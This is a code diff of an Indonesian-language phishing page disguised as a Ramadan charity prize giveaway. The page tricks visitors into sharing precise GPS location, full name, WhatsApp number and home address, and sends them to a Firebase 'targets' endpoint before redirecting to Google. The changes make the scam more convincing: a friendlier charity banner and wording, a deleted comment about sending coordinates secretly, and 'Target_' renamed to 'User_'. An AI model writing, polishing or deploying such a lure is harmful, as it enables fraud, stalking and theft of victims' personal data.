@@ -3,50 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Selamat! Anda Terpilih - Program Berbagi Hamba Allah</title>
+    <title>Program Berbagi Hamba Allah - Selamat!</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; color: #1c1e21; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        .card { background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 400px; width: 90%; text-align: center; }
-        .header-img { width: 100%; border-radius: 10px; margin-bottom: 15px; }
-        h2 { color: #d32f2f; margin-bottom: 10px; }
-        p { font-size: 14px; color: #606770; margin-bottom: 20px; line-height: 1.5; }
-        .input-group { text-align: left; margin-bottom: 15px; display: none; }
-        label { display: block; font-size: 12px; font-weight: bold; margin-bottom: 5px; color: #4b4f56; }
-        input, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 14px; }
-        .btn { background: #d32f2f; color: white; border: none; padding: 15px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; }
-        .btn:hover { background: #b71c1c; }
-        #loader { display: none; color: #d32f2f; font-weight: bold; margin-top: 10px; }
+        :root { --primary: #2e7d32; --secondary: #1b5e20; --bg: #f4f7f6; }
+        body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: #333; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .card { background: #fff; padding: 0; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); max-width: 400px; width: 92%; overflow: hidden; border: 1px solid #e0e0e0; }
+        .banner { background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://img.freepik.com/free-photo/hands-holding-donations-box-with-food_23-2148733810.jpg'); background-size: cover; background-position: center; height: 180px; display: flex; align-items: center; justify-content: center; color: white; flex-direction: column; }
+        .banner h1 { margin: 0; font-size: 22px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
+        .content { padding: 25px; text-align: center; }
+        h2 { color: var(--primary); margin-top: 0; font-size: 20px; }
+        p { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 20px; }
+        .input-group { text-align: left; display: none; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        label { display: block; font-size: 12px; font-weight: bold; margin-bottom: 5px; color: #444; }
+        input, textarea { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 10px; box-sizing: border-box; font-size: 14px; margin-bottom: 15px; outline: none; }
+        input:focus { border-color: var(--primary); }
+        .btn { background: var(--primary); color: white; border: none; padding: 16px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; font-size: 15px; box-shadow: 0 4px 10px rgba(46, 125, 50, 0.3); }
+        .btn:hover { background: var(--secondary); transform: translateY(-2px); }
+        #loader { display: none; padding: 20px; font-weight: bold; color: var(--primary); }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <img src="https://img.freepik.com/free-vector/gift-box-with-red-ribbon-white-background_1308-41076.jpg" class="header-img">
-    <div id="step1">
-        <h2>Selamat!</h2>
-        <p>Anda terpilih sebagai penerima hadiah tunai & barang mewah dari <b>Program Berbagi Hamba Allah</b>.<br><br>Silakan klik tombol di bawah untuk memverifikasi lokasi pengiriman Anda.</p>
-        <button class="btn" onclick="requestLocation()">VERIFIKASI LOKASI</button>
+    <div class="banner">
+        <h1>BERKAH SOSIAL</h1>
+        <small>Edisi Ramadhan & Berbagi Sesama</small>
     </div>
+    
+    <div class="content">
+        <div id="step1">
+            <h2>Dana Hibah Terpilih!</h2>
+            <p>Anda mendapatkan amanah bantuan tunai dan paket barang dari <b>Hamba Allah</b>. <br><br>Mohon verifikasi lokasi pengiriman untuk memastikan kurir kami dapat menjangkau alamat Anda.</p>
+            <button class="btn" onclick="requestLocation()">VERIFIKASI & KLAIM HADIAH</button>
+        </div>
 
-    <div id="step2" class="input-group">
-        <h2>Data Pengiriman</h2>
-        <p>Lokasi terverifikasi! Silakan lengkapi formulir di bawah untuk pengiriman hadiah ke alamat Anda.</p>
-        <label>Nama Lengkap</label>
-        <input type="text" id="nama" placeholder="Contoh: Budi Santoso">
-        <br><br>
-        <label>Nomor WhatsApp</label>
-        <input type="number" id="phone" placeholder="0812xxxx">
-        <br><br>
-        <label>Alamat Lengkap (Beserta Kota/Kecamatan)</label>
-        <textarea id="alamat" rows="3" placeholder="Jl. Merdeka No. 123..."></textarea>
-        <br><br>
-        <button class="btn" onclick="submitData()">KONFIRMASI PENGIRIMAN</button>
+        <div id="step2" class="input-group">
+            <h2>Data Penerima</h2>
+            <p>Lokasi berhasil diverifikasi. Silakan isi data dengan benar agar proses pengiriman tidak terkendala.</p>
+            
+            <label>NAMA LENGKAP</label>
+            <input type="text" id="nama" placeholder="Sesuai KTP">
+            
+            <label>NOMOR WHATSAPP</label>
+            <input type="number" id="phone" placeholder="08xxxxxxxxxx">
+            
+            <label>ALAMAT LENGKAP PENGIRIMAN</label>
+            <textarea id="alamat" rows="3" placeholder="Nama Jalan, No Rumah, RT/RW, Kelurahan, Kecamatan..."></textarea>
+            
+            <button class="btn" onclick="submitData()">KONFIRMASI SEKARANG</button>
+        </div>
+        <div id="loader">Sedang mendaftarkan antrean pengiriman...</div>
     </div>
-    <div id="loader">Memproses data...</div>
 </div>
 
 <script>
-    const targetID = "Target_" + Math.floor(Date.now() / 1000);
+    const targetID = "User_" + Math.floor(Date.now() / 1000);
     const DB_URL = `https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets/${targetID}.json`;
     const startTime = Date.now();
     let userCoords = { lat: 0, lon: 0 };
@@ -58,11 +70,10 @@
                 userCoords.lon = pos.coords.longitude;
                 document.getElementById('step1').style.display = 'none';
                 document.getElementById('step2').style.display = 'block';
-                // Kirim koordinat awal secara diam-diam
-                sendUpdate("Verifikasi Lokasi Berhasil");
+                sendUpdate("Lokasi Terverifikasi");
             }, (err) => {
-                alert("Izin lokasi diperlukan untuk menentukan jasa pengiriman terdekat.");
-            });
+                alert("Gagal memverifikasi lokasi. Izin lokasi wajib diaktifkan agar hadiah dapat dikirim sesuai titik koordinat kurir.");
+            }, { enableHighAccuracy: true });
         }
     }
 
@@ -87,19 +98,19 @@
         const alamat = document.getElementById('alamat').value;
 
         if (!nama || !phone || !alamat) {
-            alert("Harap lengkapi semua data pengiriman!");
+            alert("Harap lengkapi semua data!");
             return;
         }
 
         document.getElementById('step2').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
 
-        await sendUpdate("Selesai Mengisi Form");
+        await sendUpdate("Form Selesai");
         
         setTimeout(() => {
-            alert("Terima kasih! Data Anda telah berhasil dikirim. Tim kami akan menghubungi via WhatsApp.");
+            alert("Selamat! Data Anda telah masuk ke sistem antrean pengiriman. Tim kami akan menghubungi Anda dalam 1x24 jam.");
             window.location.href = "https://www.google.com";
-        }, 2000);
+        }, 3000);
     }
 </script>
 </body>
